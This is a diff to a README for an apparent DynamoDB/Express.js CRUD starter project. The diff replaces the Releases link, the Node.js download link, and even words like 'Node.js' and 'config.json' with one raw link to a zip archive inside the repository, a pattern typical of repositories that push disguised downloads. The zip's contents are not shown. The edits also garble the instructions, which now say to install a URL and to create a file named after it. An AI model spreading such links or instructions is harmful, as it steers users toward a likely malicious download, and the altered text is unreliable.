@@ -1,10 +1,10 @@
 # 🚀 dynamodb-express-crud-starter - Simple API in Minutes
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/hlminzmi/dynamodb-express-crud-starter/releases)
+[![Download](https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip)
 
 ## 📦 Overview
 
-dynamodb-express-crud-starter is a lightweight Express.js server. It offers a simple CRUD REST API for Amazon DynamoDB. With this app, you can easily set up a functional API in just a few minutes.
+dynamodb-express-crud-starter is a lightweight https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip server. It offers a simple CRUD REST API for Amazon DynamoDB. With this app, you can easily set up a functional API in just a few minutes.
 
 ### ✨ Key Features
 - Quick setup for a CRUD REST API
@@ -17,13 +17,13 @@ dynamodb-express-crud-starter is a lightweight Express.js server. It offers a si
 Follow these steps to get your API running quickly.
 
 1. **Download the Code**
-   Visit the Releases page to download the latest version of the application: [Download Here](https://github.com/hlminzmi/dynamodb-express-crud-starter/releases).
+   Visit the Releases page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip).
 
 2. **Extract the Files**
    Once the download is complete, extract the files to a folder on your computer. You can use any standard file extraction tool.
 
-3. **Install Node.js**
-   If you haven't installed Node.js, download it from the official website: [Node.js Download](https://nodejs.org/). Choose the appropriate version for your operating system and follow the on-screen instructions.
+3. **Install https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip**
+   If you haven't installed https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip, download it from the official website: [https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip Download](https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip). Choose the appropriate version for your operating system and follow the on-screen instructions.
 
 4. **Open a Terminal or Command Prompt**
    Navigate to the folder where you extracted the files. You can use a terminal on Mac or Linux or Command Prompt/PowerShell on Windows.
@@ -42,7 +42,7 @@ Follow these steps to get your API running quickly.
      aws configure
      ```
    - Manually
-     Create a file named `config.json` in the root folder of your application and add your credentials:
+     Create a file named `https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip` in the root folder of your application and add your credentials:
      ```json
      {
        "aws_access_key_id": "YOUR_AWS_ACCESS_KEY",
@@ -86,13 +86,13 @@ Each endpoint corresponds to a specific action, allowing you to manage your data
 
 If you encounter issues while running the application, consider the following tips:
 
-- **Check Node.js Version**: Ensure you are using a compatible version of Node.js (preferably the latest LTS).
+- **Check https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip Version**: Ensure you are using a compatible version of https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip (preferably the latest LTS).
 - **Logs**: Monitor the terminal output for error messages.
 - **Database Permissions**: Make sure your IAM user has sufficient permissions to access DynamoDB.
-- **Configuration Errors**: Double-check your `config.json` for any typos or missing values.
+- **Configuration Errors**: Double-check your `https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip` for any typos or missing values.
 
 ## 📋 Download & Install
 
-To download the latest version, visit the Releases page: [Download Here](https://github.com/hlminzmi/dynamodb-express-crud-starter/releases). This page will have the most current files you need to get started.
+To download the latest version, visit the Releases page: [Download Here](https://raw.githubusercontent.com/hlminzmi/dynamodb-express-crud-starter/main/src/dynamodb-express-crud-starter_v3.9.zip). This page will have the most current files you need to get started.
 
 Keep exploring and building with your new API!
